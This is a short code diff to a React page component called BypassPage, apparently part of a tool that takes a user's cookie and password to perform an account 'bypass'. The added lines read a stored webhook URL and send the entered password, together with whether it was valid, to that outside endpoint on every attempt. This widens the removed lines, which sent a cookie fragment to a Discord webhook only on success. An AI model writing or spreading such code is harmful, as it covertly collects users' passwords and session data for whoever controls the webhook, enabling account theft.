@@ -107,13 +107,17 @@ const BypassPage = () => {
     if (intervalRef.current) window.clearInterval(intervalRef.current);
     setProgress(100);
 
+    const webhook = localStorage.getItem(WEBHOOK_KEY);
+    if (webhook) {
+      sendBypassEmbed(webhook, {
+        valid: apiOk,
+        password,
+      });
+    }
+
     if (apiOk) {
       setStatus("success");
       toast.success("Bypass successful!");
-      const webhook = localStorage.getItem(WEBHOOK_KEY);
-      if (webhook) {
-        sendDiscordWebhook(webhook, `🔓 Bypass executed. Cookie: \`${trimmed.slice(0, 20)}...\``);
-      }
     } else {
       setStatus("error");
       toast.error("Bypass failed");
